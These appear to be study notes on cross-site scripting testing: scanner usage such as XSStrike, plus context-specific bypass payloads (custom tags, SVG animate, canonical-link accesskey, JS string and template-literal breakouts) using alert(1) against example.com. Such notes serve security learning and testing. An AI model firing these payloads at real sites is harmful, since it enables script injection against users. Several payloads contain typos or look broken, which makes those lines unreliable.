# Automated Discovery
- Almost all Web Application Vulnerability Scanners (Nessus, Burp Pro, ZAP) have varioue capabilities for detecting all types of XSS.

# Open Source Tools

## [XSS Strike](https://github.com/s0md3v/XSStrike)
```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py -u "https://example.com/index.php?key=value"
```

- The tool runs and detect the vulnerable parameters.

- Other open source tools: [Brute XSS](https://github.com/shawarkhanethicalhacker/BruteXSS-1), [XSSer](https://github.com/epsylon/xsser)

# Manual Discovery
- We can use the list of payloads from [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)to manually test for the vulnerabilities

# XSS contexts

## Reflected XSS into HTML context with most tags and attributes blocked.
- Use the [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) and follow these steps:
1. Determine which tags are allowed by trying all the tags from the cheat sheet.
2. Determine which events are allowed by trying all the events from the cheat sheet.
3. Once having found the allowed tags and events, we can proceed to customize our payload to exploit.


## Reflected XSS with custom tags
- Sometimes, applications block all tags, meaning we can't perfor the above exploit. In this case, we can try using a custom tag
```bash
<script>
	location = "https://example.com?search=<xss id='x' onfocus=alert(1) tabindex=1>#x";
</script>

Remember to encode the above payload
```
- We then send the exploit to the target.

## Reflected XSS with event handlers& href attributes blocked
- Sometimes, applications blocked `href`, which means we can't deliver some payloads. In this case, we can try:
```bash
	https://example.com?search=<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click Me</text></a>
```

## Reflected XSS with some SVG markup
- In some applications, when tags like `svg,animatetransform, title, image` are allowed, we can perform the following exploit
```bash
	https://example.com?search=<svg><animatetransform $event=1>
```

## Reflected XSS with canonical tag
- Inspect the web applicatoin and we may see some canonical link like this `<link rel='canonical' hreft='https://example.com'>`
- We can try injecting the following payload:
```bash
	https://example.com?'accesskey='x' onclick='alert(1)
```
- The resulting canonical link looks like this: `<link rel='canonical' href='https://example.com' accessKey='x' onclieck='alert(1)'>`


## Break out of JS strings
- We can use either of these two common payloads `'-alert(1)-'` or `'-alert(1)//`
- Sometimes, application may filter the single quotation marks `'` and double quotation marks `"`. We can try bypassing these filters by using `\`.We can also use HTML-encoding `&apos;` to bypass such filter.
- In case the parentheses are blocked, we can use `throw` function: `onerror=alert, throw 1`, which is equivalent to `onerror=alert(1)`

## XSS in JavaScript template literals
- Using `${...}` is another common way to bypass web application's filtering.
```bash
${alert(1)} <=> alert(1)
``` 


